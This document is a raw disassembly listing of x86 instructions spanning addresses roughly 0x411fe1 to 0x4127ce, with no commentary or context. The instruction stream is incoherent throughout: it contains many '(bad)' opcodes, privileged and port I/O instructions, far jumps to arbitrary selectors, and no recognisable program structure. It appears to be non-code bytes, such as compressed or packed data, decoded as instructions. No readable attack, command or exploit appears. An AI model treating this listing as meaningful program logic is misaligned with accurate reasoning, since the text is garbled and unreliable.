  411fe1:	mov    ebx,cr7
  411fe4:	pusha  
  411fe5:	retf   0xdce6
  411fe8:	fwait
  411fe9:	and    DWORD PTR [ebp+ebp*2-0x21],ebx
  411fed:	add    eax,0xe490fca2
  411ff2:	inc    edi
  411ff3:	lahf   
  411ff4:	push   edx
  411ff5:	fadd   st(0),st
  411ff7:	cmp    esi,DWORD PTR [eax-0x7869f7c]
  411ffd:	iret   
  411ffe:	pop    ebx
  411fff:	jne    0x411f88
  412001:	pop    ebp
  412002:	inc    edx
  412003:	pop    edi
  412004:	les    eax,FWORD PTR [ecx-0x5c]
  412007:	xchg   DWORD PTR [esi-0x7e],esi
  41200a:	dec    esp
  41200b:	fs mov ebp,0xc68f8c02
  412011:	jle    0x411fda
  412013:	jmp    0xf1df:0xdf1f19f8
  41201a:	xor    DWORD PTR fs:[eax-0x4e4409db],edx
  412021:	in     eax,0x88
  412023:	sub    ecx,DWORD PTR [eax]
  412025:	shr    DWORD PTR [ecx+0x2b],cl
  412028:	in     al,dx
  412029:	int    0x14
  41202b:	jo     0x411fb6
  41202d:	icebp  
  41202e:	add    eax,0x7d3ec811
  412033:	mov    dh,BYTE PTR [edi]
  412035:	add    cl,BYTE PTR [esi+0x62]
  412038:	(bad)  
  412039:	push   esi
  41203a:	je     0x411fe5
  41203c:	sti    
  41203d:	cs pop ds
  41203f:	int    0x51
  412041:	or     eax,0x9526c517
  412046:	and    esp,edx
  412048:	dec    ebp
  412049:	test   al,0x90
  41204b:	mov    BYTE PTR [ecx+0x7b],bl
  41204e:	out    0x3a,al
  412050:	mov    ecx,esp
  412052:	scas   eax,DWORD PTR es:[edi]
  412053:	inc    eax
  412054:	(bad)  
  412055:	mov    eax,ds:0x4abfada3
  41205a:	push   esi
  41205b:	push   ebx
  41205c:	mov    al,BYTE PTR [edx]
  41205e:	cdq    
  41205f:	div    BYTE PTR [eax-0x52a696ee]
  412065:	jg     0x412014
  412067:	icebp  
  412068:	mov    cl,dh
  41206a:	mov    ecx,0x7edd9e64
  41206f:	aam    0xf0
  412071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412072:	dec    esp
  412073:	ja     0x411fff
  412075:	xlat   BYTE PTR ds:[ebx]
  412076:	out    0xdf,al
  412078:	mov    DWORD PTR [ebx+0x49],ecx
  41207b:	(bad)  
  41207c:	(bad)  [ebp-0x1]
  41207f:	sbb    ah,bl
  412081:	push   edx
  412082:	jmp    0x94e5:0xca02a756
  412089:	fidiv  DWORD PTR [esi+0x4e]
  41208c:	mov    fs,edi
  41208e:	jne    0x412083
  412090:	xchg   ecx,eax
  412091:	test   eax,0x93e2d591
  412096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412097:	dec    esp
  412098:	sub    DWORD PTR [ebx+0x6a],ecx
  41209b:	test   DWORD PTR [edi+0x72757e05],ebp
  4120a1:	pushf  
  4120a2:	and    eax,0x9bab8987
  4120a7:	ror    BYTE PTR [eax+0x2c],1
  4120aa:	scas   al,BYTE PTR es:[edi]
  4120ab:	sub    eax,esi
  4120ad:	add    eax,0x49e6e89c
  4120b2:	fadd   DWORD PTR ss:[esi]
  4120b5:	adc    DWORD PTR [ecx+0x3a0328e7],edx
  4120bb:	out    dx,al
  4120bc:	mov    dh,0x45
  4120be:	bound  esp,QWORD PTR [ebx-0x4ffcc9]
  4120c4:	xor    al,0x6d
  4120c6:	dec    esp
  4120c7:	jg     0x412083
  4120c9:	mov    BYTE PTR [eax+0x7],ah
  4120cc:	repnz or edi,esp
  4120cf:	mov    ch,0xcf
  4120d1:	pushf  
  4120d2:	mov    dl,0x44
  4120d4:	mul    BYTE PTR [ecx-0x26ade4e1]
  4120da:	adc    DWORD PTR [eax+0x6e],ebx
  4120dd:	add    al,0x1f
  4120df:	inc    ebp
  4120e0:	jo     0x412062
  4120e2:	and    ebx,esi
  4120e4:	pop    esp
  4120e5:	mov    eax,ds:0x7d7ad4bc
  4120ea:	push   ds
  4120eb:	fs jmp 0x1f07:0x7546f153
  4120f3:	jne    0x4120fc
  4120f5:	dec    ecx
  4120f6:	ds dec ebx
  4120f8:	fadd   QWORD PTR [eax-0x3c]
  4120fb:	aad    0xb5
  4120fd:	push   eax
  4120fe:	aam    0xe
  412100:	jns    0x4120d8
  412102:	fbstp  TBYTE PTR ds:0x6079389
  412108:	xchg   esi,eax
  412109:	adc    BYTE PTR [ecx-0x9],dh
  41210c:	retf   
  41210d:	add    eax,0xb42a2096
  412112:	and    DWORD PTR [eax-0x6c],esi
  412115:	jmp    0x781b:0xf28bcd60
  41211c:	mov    al,ds:0xc8d4d8d3
  412121:	not    BYTE PTR [ebx+0x354b33e]
  412127:	mov    BYTE PTR cs:[edi+0x6c1ec4c3],dl
  41212e:	fnsetpm(287 only) 
  412130:	shr    DWORD PTR [edx+0x5c],cl
  412133:	jg     0x412108
  412135:	add    bl,BYTE PTR [ecx+edx*1-0x2e8949c6]
  41213c:	mov    BYTE PTR [ecx],ah
  41213e:	loopne 0x412170
  412140:	mov    BYTE PTR [eax],cl
  412142:	ins    BYTE PTR es:[edi],dx
  412143:	mov    ebx,0xe0ec05ea
  412148:	out    0x81,eax
  41214a:	lds    ebx,FWORD PTR [eax+eax*1-0x2880e0eb]
  412151:	stos   BYTE PTR es:[edi],al
  412152:	xor    eax,DWORD PTR [edx]
  412154:	cmp    al,0x80
  412156:	ret    0x95d4
  412159:	mov    edx,0x47443d0d
  41215e:	sbb    DWORD PTR [ebx],edx
  412160:	mov    DWORD PTR [edi-0x4a56d53b],esp
  412166:	pop    esi
  412167:	aam    0xd0
  412169:	add    eax,0x764fff26
  41216e:	mov    al,ds:0x1f99f5e0
  412173:	sbb    DWORD PTR [ecx],ebx
  412175:	jle    0x41213c
  412177:	aas    
  412178:	mov    esp,0xf099c89a
  41217d:	mov    al,0xcc
  41217f:	aam    0x23
  412181:	(bad)  
  412182:	dec    esp
  412183:	mov    bl,0xb
  412185:	pop    eax
  412186:	pop    ds
  412187:	jne    0x412173
  412189:	and    ch,BYTE PTR [eax+ebx*8-0x2a16fde2]
  412190:	aam    0x26
  412192:	mov    ds:0xa6343035,eax
  412197:	mov    dl,0x82
  412199:	stc    
  41219a:	ins    BYTE PTR es:[edi],dx
  41219b:	(bad)  
  41219c:	cmp    ebp,eax
  41219e:	pop    ds
  41219f:	es in  al,dx
  4121a1:	scas   eax,DWORD PTR es:[edi]
  4121a2:	fild   QWORD PTR [edx-0x53fafa4f]
  4121a8:	jns    0x41216d
  4121aa:	inc    eax
  4121ab:	ror    BYTE PTR [ebx],0xcf
  4121ae:	jl     0x41218b
  4121b0:	xor    ebp,DWORD PTR [edx-0x448d16fa]
  4121b6:	pop    ds
  4121b7:	sbb    dh,al
  4121b9:	xchg   edi,eax
  4121ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bb:	cdq    
  4121bc:	inc    esp
  4121bd:	out    dx,al
  4121be:	rcl    ah,0x24
  4121c1:	imul   eax,DWORD PTR [ebx],0xffffff96
  4121c4:	adc    bh,BYTE PTR [ecx+0x71bd9960]
  4121ca:	push   edi
  4121cb:	dec    esp
  4121cc:	push   eax
  4121cd:	mov    edx,0xec0ad6b3
  4121d2:	ja     0x41223d
  4121d4:	xchg   edx,eax
  4121d5:	inc    edx
  4121d6:	addr16 in al,0xff
  4121d9:	jb     0x41222a
  4121db:	fimul  WORD PTR [ebp+0x31]
  4121de:	push   ds
  4121df:	xchg   ebx,eax
  4121e0:	scas   eax,DWORD PTR es:[edi]
  4121e1:	jnp    0x4121fb
  4121e3:	mov    al,ds:0xad362714
  4121e8:	add    edx,DWORD PTR [eax+0x7763fed2]
  4121ee:	mov    es,WORD PTR [eax-0x4d]
  4121f1:	lds    esp,FWORD PTR [edi+0x4f]
  4121f4:	rcr    DWORD PTR [esi+0x51],cl
  4121f7:	ins    DWORD PTR es:[edi],dx
  4121f8:	push   cs
  4121f9:	aaa    
  4121fa:	or     eax,0x9b500945
  4121ff:	sbb    BYTE PTR [edx-0x31c4e5da],bh
  412205:	(bad)  
  412206:	and    eax,0x10d2a735
  41220b:	mov    ch,0x41
  41220d:	addr16 xchg ecx,eax
  41220f:	jae    0x41226c
  412211:	sbb    eax,0xa9d88357
  412216:	or     ch,al
  412218:	out    dx,al
  412219:	pop    edi
  41221a:	shl    DWORD PTR [eax+esi*2-0xa],1
  41221e:	mov    eax,ds:0x33c287d7
  412223:	pop    ds
  412224:	push   esi
  412225:	popf   
  412226:	mov    eax,esp
  412228:	out    0xad,al
  41222a:	pop    ds
  41222b:	sub    eax,0xcfa56898
  412230:	pushf  
  412231:	inc    ebp
  412232:	mov    ebx,0x1217b8d4
  412237:	push   edx
  412238:	jecxz  0x4121c6
  41223a:	loopne 0x4121ff
  41223c:	mov    DWORD PTR [edi+0x596d5d13],esi
  412242:	mov    edi,0x38032e38
  412247:	xchg   ebx,eax
  412248:	in     al,0xa0
  41224a:	cmp    BYTE PTR ds:0x9b60f74f,dl
  412250:	xchg   ebx,eax
  412251:	xchg   esi,eax
  412252:	xor    eax,0xc7c31ed6
  412257:	aam    0x4b
  412259:	or     eax,0x16a4e66c
  41225e:	and    al,BYTE PTR [ecx]
  412260:	mov    ch,0x15
  412262:	mov    dh,0x75
  412264:	mov    DWORD PTR [ecx-0x6f677de6],ebp
  41226a:	add    esp,edx
  41226c:	mov    ds:0x6946919b,eax
  412271:	test   BYTE PTR [eax-0x56],al
  412274:	mov    ebx,edi
  412276:	aad    0x3b
  412278:	or     al,0x48
  41227a:	cmc    
  41227b:	and    bl,al
  41227d:	add    dh,BYTE PTR [ecx+ebx*8]
  412280:	dec    esp
  412281:	jg     0x41223a
  412283:	push   eax
  412284:	lea    ecx,[edi]
  412286:	pusha  
  412287:	jmp    0x412281
  412289:	mov    dh,0x4e
  41228b:	jb     0x412267
  41228d:	push   ecx
  41228e:	or     esp,DWORD PTR [ebp-0x144b101e]
  412294:	mov    edx,0xb892df25
  412299:	call   0x8973f1c8
  41229e:	pop    ds
  41229f:	int    0x8d
  4122a1:	mov    dl,0x5d
  4122a3:	(bad)  
  4122a5:	or     DWORD PTR [edi+0x64aea1d5],ecx
  4122ab:	xchg   edi,eax
  4122ac:	pop    eax
  4122ad:	sub    eax,DWORD PTR [ecx+0x5735890b]
  4122b3:	push   ebp
  4122b4:	pop    es
  4122b5:	outs   dx,DWORD PTR ds:[esi]
  4122b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122b7:	jge    0x4122c9
  4122b9:	add    bl,BYTE PTR [esi+0x29]
  4122bc:	cdq    
  4122bd:	mov    WORD PTR [bx+si],?
  4122c0:	pop    ds
  4122c1:	adc    al,0x5c
  4122c3:	lahf   
  4122c4:	fdiv   DWORD PTR [ebx+0x295317c]
  4122ca:	xor    eax,0x40e38454
  4122cf:	aad    0x19
  4122d1:	mov    ds:0x875bd563,eax
  4122d6:	mov    esp,DWORD PTR [edi]
  4122d8:	neg    DWORD PTR [ebx]
  4122da:	xor    al,0xd1
  4122dc:	jge    0x412349
  4122de:	or     eax,0x9feaa6b6
  4122e3:	hlt    
  4122e4:	pop    ebx
  4122e5:	sbb    al,0xc
  4122e7:	adc    DWORD PTR [bx+di],edx
  4122ea:	and    ecx,DWORD PTR [ecx]
  4122ec:	mov    BYTE PTR [edx-0x64],bl
  4122ef:	dec    esi
  4122f0:	mov    BYTE PTR [edi+0x33effa77],bh
  4122f6:	loopne 0x41236d
  4122f8:	or     DWORD PTR [ebx],eax
  4122fa:	jle    0x4122e3
  4122fc:	retf   
  4122fd:	inc    ebx
  4122fe:	add    DWORD PTR [eax+0x62],0xffffff9d
  412302:	pusha  
  412303:	sub    DWORD PTR [eax-0x1df7c094],esi
  412309:	mov    esi,0xabb5d413
  41230e:	xchg   esi,esp
  412310:	in     eax,0x63
  412312:	mov    esp,0x326989a8
  412317:	shr    BYTE PTR [ebp-0x45ba526a],1
  41231d:	add    ecx,DWORD PTR [esi+0x46]
  412320:	add    bh,BYTE PTR [ebx]
  412322:	dec    edx
  412323:	ins    BYTE PTR es:[edi],dx
  412324:	jns    0x4122b8
  412326:	add    BYTE PTR [ecx-0x78],ch
  412329:	mov    bh,0xcc
  41232b:	jge    0x41235b
  41232d:	imul   DWORD PTR [edi-0x5fc8671]
  412333:	cmp    al,0xed
  412335:	imul   ebx,DWORD PTR [edx+0x1f6d3d8a],0x61
  41233c:	int3   
  41233d:	push   ecx
  41233e:	sbb    esp,DWORD PTR [ebp+0x40]
  412341:	xlat   BYTE PTR ds:[ebx]
  412342:	xchg   ah,dl
  412344:	and    ch,cl
  412346:	jo     0x4122f3
  412348:	rcr    DWORD PTR [edx],1
  41234a:	fdiv   st,st(4)
  41234c:	mov    BYTE PTR [ebp-0x78],bh
  41234f:	(bad)  
  412350:	dec    ebx
  412351:	mov    WORD PTR [ebx-0x69fde422],fs
  412357:	push   0x52
  412359:	mov    BYTE PTR [edi-0x5f],bh
  41235c:	push   es
  41235d:	cmc    
  41235e:	adc    ebx,DWORD PTR [ebx+0x3100eb88]
  412364:	mov    ebx,0xddc9318d
  412369:	xchg   edx,eax
  41236a:	mov    ebp,0xbdc5899d
  41236f:	(bad)  
  412371:	xchg   esi,eax
  412372:	in     al,0x3c
  412374:	icebp  
  412375:	mov    bl,0xdc
  412377:	aad    0x7d
  412379:	cmc    
  41237a:	arpl   WORD PTR [ebx-0x4],si
  41237d:	cld    
  41237e:	sub    bh,dl
  412380:	loop   0x4123c7
  412382:	jp     0x4123e6
  412384:	icebp  
  412385:	or     al,0xbf
  412387:	cmc    
  412388:	mov    DWORD PTR [ebx-0x4e],esi
  41238b:	outs   dx,BYTE PTR ds:[esi]
  41238c:	dec    ebp
  41238d:	test   BYTE PTR [edx+0x280225b5],0xce
  412394:	sbb    eax,0x57aad187
  412399:	bound  ebx,QWORD PTR [edi]
  41239b:	xor    eax,0x9f3830fa
  4123a0:	loop   0x412416
  4123a2:	lgs    ecx,FWORD PTR [edi]
  4123a5:	sbb    DWORD PTR [esi-0x39],esp
  4123a8:	retf   
  4123a9:	lods   eax,DWORD PTR ds:[esi]
  4123aa:	outs   dx,DWORD PTR ds:[esi]
  4123ab:	pop    ebp
  4123ac:	int3   
  4123ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ae:	out    0xdd,al
  4123b0:	mov    BYTE PTR [ebp-0x48],cl
  4123b3:	xchg   DWORD PTR [esi],ebx
  4123b5:	add    eax,DWORD PTR [ebx]
  4123b7:	fld    DWORD PTR [ebx]
  4123b9:	mov    ebp,DWORD PTR [ecx-0x4cb97789]
  4123bf:	xchg   ebp,eax
  4123c0:	cdq    
  4123c1:	stos   DWORD PTR es:[edi],eax
  4123c2:	addr16 sti 
  4123c4:	stc    
  4123c5:	sub    BYTE PTR [ebx+ebp*4+0x6a701fa7],dl
  4123cc:	adc    DWORD PTR [ebx+0x7],ebx
  4123cf:	xlat   BYTE PTR ds:[ebx]
  4123d0:	push   ds
  4123d1:	xor    al,0xd
  4123d3:	mov    eax,0xfe96326b
  4123d8:	leave  
  4123d9:	mov    edx,0xb37f5a60
  4123de:	or     dl,BYTE PTR [edx-0x2753947d]
  4123e4:	adc    al,0xfb
  4123e6:	pop    ds
  4123e7:	das    
  4123e8:	frstor [edx]
  4123ea:	inc    edi
  4123eb:	andps  xmm1,XMMWORD PTR [ebp-0x7e725b83]
  4123f2:	mov    ds:0xe0692362,eax
  4123f7:	out    0xf3,al
  4123f9:	add    eax,0x3005117f
  4123fe:	addr16 sub al,0xff
  412401:	inc    esi
  412402:	push   esi
  412403:	fstp   TBYTE PTR [ecx-0x80]
  412406:	inc    ebx
  412407:	das    
  412408:	jmp    0x1fa4:0x1224f4c5
  41240f:	cmp    edx,DWORD PTR [edi-0x33]
  412412:	fstp   QWORD PTR [ebp-0x62272d7c]
  412418:	sub    esp,DWORD PTR gs:[ebx+0x6636f257]
  41241f:	sub    eax,0x6937e5ac
  412424:	mov    BYTE PTR [ebx+0x52],al
  412427:	mov    dh,0x81
  412429:	in     al,0x51
  41242b:	xchg   ebp,eax
  41242c:	pop    eax
  41242d:	push   cs
  41242e:	dec    esp
  41242f:	aam    0xed
  412431:	rol    bl,1
  412433:	jns    0x4123ed
  412435:	lods   al,BYTE PTR ds:[esi]
  412436:	rcl    ecx,0x6a
  412439:	es pop es
  41243b:	int3   
  41243c:	fadd   st,st(1)
  41243e:	jg     0x412445
  412440:	mov    eax,ebp
  412442:	bound  ebx,QWORD PTR ss:[edi+0x10d2a321]
  412449:	pop    ebp
  41244a:	mov    ecx,0xdead5ed4
  41244f:	mov    bl,0xf6
  412451:	push   ebp
  412452:	loope  0x41241f
  412454:	mov    BYTE PTR [ebp+0x6a28c860],dl
  41245a:	lods   al,BYTE PTR ds:[esi]
  41245b:	xlat   BYTE PTR ds:[ebx]
  41245c:	lods   al,BYTE PTR ds:[esi]
  41245d:	cmc    
  41245e:	test   al,0xd4
  412460:	loope  0x41245b
  412462:	inc    ebp
  412463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412464:	nop
  412465:	pop    eax
  412466:	push   0xadab89b7
  41246b:	dec    eax
  41246c:	push   cs
  41246d:	pop    es
  41246e:	pop    ebx
  41246f:	rol    BYTE PTR [ebp-0x52d9d1fb],0xad
  412476:	(bad)  
  412477:	pop    ecx
  412478:	in     eax,dx
  412479:	jp     0x41249a
  41247b:	cmp    DWORD PTR [ebx+0x6a569ed4],ebp
  412481:	retf   
  412482:	mov    DWORD PTR [edi-0x2aab05d3],ebx
  412488:	stos   DWORD PTR es:[edi],eax
  412489:	inc    ebp
  41248a:	sbb    esp,DWORD PTR [ecx]
  41248c:	jns    0x412465
  41248e:	loopne 0x4124e4
  412490:	cmp    eax,0x20a7f364
  412495:	add    edi,esp
  412497:	push   esp
  412498:	jbe    0x4124a0
  41249a:	mov    ch,0x30
  41249c:	push   edx
  41249d:	xor    DWORD PTR [edi],ebx
  41249f:	adc    ebx,DWORD PTR [ebp+0x4e]
  4124a2:	into   
  4124a3:	adc    BYTE PTR [ebp-0x4f384e44],dh
  4124a9:	and    al,0xa2
  4124ab:	xor    ebp,DWORD PTR ds:0xab95a0c4
  4124b1:	fwait
  4124b2:	das    
  4124b3:	fdivr  st(3),st
  4124b5:	pop    edi
  4124b6:	repnz int 0x8f
  4124b9:	mov    edi,0x1c3a3785
  4124be:	fcom   QWORD PTR [esi+0x33]
  4124c1:	push   ecx
  4124c2:	out    dx,eax
  4124c3:	es jne 0x4124da
  4124c6:	fisub  DWORD PTR [eax-0x2a8143c2]
  4124cc:	or     BYTE PTR [ebx+0x57],al
  4124cf:	mov    DWORD PTR ss:[ecx+0x59],edi
  4124d3:	pop    ecx
  4124d4:	shl    BYTE PTR [edx+0x49],1
  4124d7:	in     eax,0x85
  4124d9:	daa    
  4124da:	sbb    BYTE PTR [ecx-0x6e20a927],cl
  4124e0:	fmul   QWORD PTR [ecx+0x74]
  4124e3:	aaa    
  4124e4:	mov    DWORD PTR [ecx+0x43e947ac],ecx
  4124ea:	inc    eax
  4124eb:	outs   dx,BYTE PTR ds:[esi]
  4124ec:	not    BYTE PTR [eax]
  4124ee:	ss cli 
  4124f0:	enter  0x60ee,0xbb
  4124f4:	mov    esi,ecx
  4124f6:	enter  0x8878,0x27
  4124fa:	call   0x7fb8:0xcb9acffc
  412501:	dec    ebx
  412502:	push   0xffffffef
  412504:	jae    0x412488
  412506:	dec    edi
  412507:	or     dl,al
  412509:	jle    0x4124f5
  41250b:	xacquire xchg BYTE PTR [edi+0x366d9e6d],ch
  412512:	mov    ss,WORD PTR ds:[esi]
  412515:	inc    edi
  412516:	gs aam 0xb2
  412519:	jp     0x412567
  41251b:	jno    0x412570
  41251d:	sbb    ecx,ebp
  41251f:	(bad)  
  412520:	lea    esi,[ebx+0x4]
  412523:	mov    eax,ds:0x54970a6c
  412528:	push   esp
  412529:	test   edi,0xdf3bbcd2
  41252f:	rcr    BYTE PTR [eax-0x10],cl
  412532:	mov    al,ds:0x1f0c6ee0
  412537:	test   eax,0x458596b7
  41253c:	es stc 
  41253e:	lods   eax,DWORD PTR ds:[esi]
  41253f:	aad    0x36
  412541:	jmp    0x412547
  412543:	ret    
  412544:	inc    edi
  412545:	rol    DWORD PTR [ebx+ecx*2-0x78],1
  412549:	rol    ecx,0xd8
  41254c:	jg     0x4125a5
  41254e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41254f:	sub    eax,0xd6fa021f
  412554:	push   ecx
  412555:	xor    ah,cl
  412557:	dec    eax
  412558:	push   ebp
  412559:	sbb    DWORD PTR [esi],ebx
  41255b:	repz imul eax,DWORD PTR [eax+eax*8],0x95516a3f
  412563:	ror    DWORD PTR [eax+0x6e],cl
  412566:	sub    edi,esi
  412568:	loope  0x412550
  41256a:	in     eax,0x5c
  41256c:	dec    edx
  41256d:	rol    DWORD PTR [esi],1
  41256f:	fmul   QWORD PTR [edi-0x38]
  412572:	pop    ds
  412573:	test   eax,0x55341c64
  412578:	into   
  412579:	cmp    eax,0xa05cd5f5
  41257e:	mov    esp,0x63c6fc11
  412583:	push   edx
  412584:	mov    DWORD PTR [ebp+0x9],ebp
  412587:	xor    ecx,DWORD PTR [edx+edx*1]
  41258a:	mov    ch,0x3d
  41258c:	data16 cli 
  41258e:	or     ecx,ecx
  412590:	jo     0x4125bd
  412592:	xchg   ebp,eax
  412594:	sub    al,BYTE PTR [edx]
  412596:	mov    eax,0x3952c80a
  41259b:	lods   al,BYTE PTR ds:[esi]
  41259c:	and    eax,0x17931fde
  4125a1:	adc    al,BYTE PTR [eax+edi*1-0x2a979534]
  4125a8:	dec    esi
  4125a9:	aam    0xb9
  4125ab:	add    al,0xf9
  4125ad:	inc    esi
  4125ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125af:	fimul  WORD PTR [ecx+0x4970c99b]
  4125b5:	sar    DWORD PTR [esi],0x40
  4125b8:	mov    bh,0x18
  4125ba:	push   ss
  4125bb:	pop    ds
  4125bc:	ins    BYTE PTR es:[edi],dx
  4125bd:	ss ret 
  4125bf:	push   ebp
  4125c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125c1:	cmp    al,0xf4
  4125c3:	out    dx,eax
  4125c4:	mov    esi,ebp
  4125c6:	lea    ecx,[ebx]
  4125c8:	inc    ebp
  4125c9:	pop    ds
  4125ca:	xchg   esp,eax
  4125cb:	push   0xd6e4bc68
  4125d0:	cwde   
  4125d1:	in     al,0xc2
  4125d3:	mov    cl,0x80
  4125d5:	mov    cs,WORD PTR [edi+0x1e47de2d]
  4125db:	cdq    
  4125dc:	mov    edi,0xb2feec54
  4125e1:	neg    BYTE PTR ds:0xff21f4d7
  4125e7:	(bad)
  4125eb:	fs mov edi,edx
  4125ee:	push   ebp
  4125ef:	jle    0x412585
  4125f1:	sbb    DWORD PTR [ebp-0x63fddba9],edi
  4125f7:	jecxz  0x4125fa
  4125f9:	lea    ebp,[esi-0x5e]
  4125fc:	mov    ebp,0xc8104f5e
  412601:	add    BYTE PTR [edi+0x6e57d03b],cl
  412607:	int3   
  412608:	mov    DWORD PTR [ebp-0xffd44f3],esi
  41260e:	push   eax
  41260f:	aam    0xe4
  412611:	lds    edi,FWORD PTR [edi-0x7715ed08]
  412617:	push   ss
  412618:	mov    bl,dl
  41261a:	cld    
  41261b:	mov    cl,0x5d
  41261d:	add    ax,0xd074
  412621:	loopne 0x41264e
  412623:	ror    eax,1
  412625:	mov    edi,DWORD PTR [ecx+0x529396fa]
  41262b:	std    
  41262c:	jno    0x412631
  41262e:	popa   
  41262f:	imul   esp,DWORD PTR [esi-0x17],0x34
  412633:	dec    ebx
  412634:	repnz mov esi,0x1938d70d
  41263a:	je     0x41262b
  41263c:	test   BYTE PTR [ebx+0x4164cf26],bl
  412642:	jp     0x412663
  412644:	mov    eax,0xb8d5c7f0
  412649:	or     DWORD PTR ds:0x7c14082f,edx
  41264f:	jns    0x41264d
  412651:	in     eax,dx
  412652:	pop    ds
  412653:	xor    al,0x2a
  412655:	cs (bad) 
  412657:	mov    edi,0xa801fc7a
  41265c:	xchg   BYTE PTR [edi],bh
  41265e:	push   ecx
  41265f:	push   ecx
  412660:	pop    esp
  412661:	(bad)  
  412662:	jmp    FWORD PTR [ecx-0x6c]
  412665:	sub    eax,0xbb5cd5d6
  41266a:	or     al,0x11
  41266c:	inc    ecx
  41266d:	mov    bl,0xdb
  41266f:	jge    0x4125fa
  412671:	jmp    0xc60ec74
  412676:	scas   al,BYTE PTR es:[edi]
  412677:	imul   ebx,DWORD PTR [esi-0x3f5db7fe],0x3529715e
  412681:	sub    BYTE PTR [edi],bl
  412683:	push   ecx
  412684:	pusha  
  412685:	and    esi,DWORD PTR [eax+0x4a]
  412688:	mov    ds:0xd1b2aae2,al
  41268e:	or     ebx,DWORD PTR [esi]
  412690:	je     0x4126f5
  412692:	lahf   
  412693:	mov    esi,0x8bcf0bc6
  412698:	mov    BYTE PTR [edx],al
  41269a:	sahf   
  41269b:	jge    0x41263d
  41269d:	sti    
  41269e:	loop   0x412639
  4126a0:	loop   0x4126a7
  4126a2:	sbb    BYTE PTR [ebp+0x31527d68],bl
  4126a8:	in     al,dx
  4126a9:	mov    eax,0x44f12364
  4126ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126af:	adc    eax,0x621f836e
  4126b4:	add    eax,DWORD PTR [ebx]
  4126b6:	adc    dl,dl
  4126b8:	mov    edi,0x29c702ba
  4126bd:	mov    eax,0x657bc760
  4126c2:	cmp    eax,0x9e5014cc
  4126c7:	mov    ebx,0x45d0a9c9
  4126cc:	enter  0xd4dd,0x59
  4126d0:	stc    
  4126d1:	dec    esi
  4126d2:	pop    ds
  4126d3:	dec    ecx
  4126d4:	js     0x412696
  4126d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d7:	mov    fs,WORD PTR [esi-0x39]
  4126da:	mov    DWORD PTR [edx+0x324ad86b],edi
  4126e0:	mov    edx,esi
  4126e2:	ds adc al,0x5a
  4126e5:	(bad)  [ebx]
  4126e7:	mov    es,WORD PTR gs:[edi+0x40]
  4126eb:	jne    0x4126b2
  4126ed:	xchg   esp,eax
  4126ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ef:	xchg   esp,eax
  4126f0:	mov    ebx,0x98c747b6
  4126f5:	add    eax,0x6542b704
  4126fa:	or     DWORD PTR [ebp-0x54],edx
  4126fd:	call   0x8110:0xef87ff08
  412704:	rol    ecx,1
  412706:	mov    edi,0xc1b51e51
  41270b:	aam    0xf3
  41270d:	adc    DWORD PTR [ecx+edx*8-0x6c87a2db],ebx
  412714:	mov    DWORD PTR [edi],edi
  412716:	(bad)  
  412718:	out    dx,eax
  412719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41271a:	jecxz  0x41276c
  41271c:	ins    BYTE PTR es:[edi],dx
  41271d:	add    ecx,esp
  41271f:	cdq    
  412720:	imul   ebx,eax,0x37e0e9dc
  412726:	add    esi,DWORD PTR [ebx-0x17798c74]
  41272c:	lea    ebx,[eax-0x57]
  41272f:	push   ebp
  412730:	add    ch,BYTE PTR [esi]
  412732:	fstp   QWORD PTR [edx+0x540bcfb2]
  412738:	outs   dx,BYTE PTR ds:[esi]
  412739:	adc    al,0xfe
  41273b:	mov    cl,BYTE PTR [eax]
  41273d:	mov    ds:0x8dfe011f,al
  412742:	mov    fs,WORD PTR [eax+ebx*2]
  412745:	(bad)  
  412747:	xlat   BYTE PTR ds:[ebx]
  412748:	or     al,0x9a
  41274a:	repz lahf 
  41274c:	add    BYTE PTR [ebp-0x6a],bh
  41274f:	out    dx,eax
  412750:	and    eax,0x88fe55c2
  412755:	fwait
  412756:	nop
  412757:	xchg   esi,eax
  412758:	xor    DWORD PTR [edi+0x4d],eax
  41275b:	xlat   BYTE PTR ds:[ebx]
  41275c:	cmp    eax,0x5de17a11
  412761:	cmp    eax,0x1bed9b1e
  412766:	push   ebx
  412767:	xchg   eax,edi
  412769:	std    
  41276a:	push   ss
  41276b:	xlat   BYTE PTR ds:[ebx]
  41276c:	add    BYTE PTR [edx-0x18f9ba15],al
  412772:	in     eax,dx
  412773:	aad    0x65
  412775:	loope  0x412783
  412777:	(bad)  
  412778:	mov    ebp,0xa626c6ce
  41277d:	arpl   WORD PTR [edi],cx
  41277f:	jg     0x41270a
  412781:	aaa    
  412782:	pop    ecx
  412783:	jmp    0xf610ba09
  412788:	daa    
  412789:	dec    ebx
  41278a:	test   WORD PTR [edi],0x8603
  41278f:	imul   edx,ecx,0xffffffae
  412792:	or     eax,DWORD PTR [ebp-0x77]
  412795:	(bad)  
  412797:	das    
  412798:	inc    ebx
  412799:	mov    esi,0xd1e2c940
  41279e:	enter  0x20d4,0xc
  4127a2:	scas   al,BYTE PTR es:[edi]
  4127a3:	pop    esp
  4127a4:	scas   eax,DWORD PTR es:[edi]
  4127a5:	dec    esp
  4127a6:	stos   BYTE PTR es:[edi],al
  4127a7:	wrmsr  
  4127a9:	and    al,0x2d
  4127ab:	xlat   BYTE PTR ds:[ebx]
  4127ac:	ror    DWORD PTR [ebp-0x34],0xad
  4127b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127b1:	aas    
  4127b2:	add    bh,dl
  4127b4:	mov    ecx,0x42ab70ec
  4127b9:	jle    0x412750
  4127bb:	sbb    dh,BYTE PTR [ecx+ebp*2-0x627629d1]
  4127c2:	ds dec eax
  4127c4:	(bad)  
  4127c5:	out    dx,al
  4127c6:	adc    BYTE PTR [edi-0xc49eaf6],al
  4127cc:	jmp    0x412777
  4127ce:	mov    eax,0x4d494e94
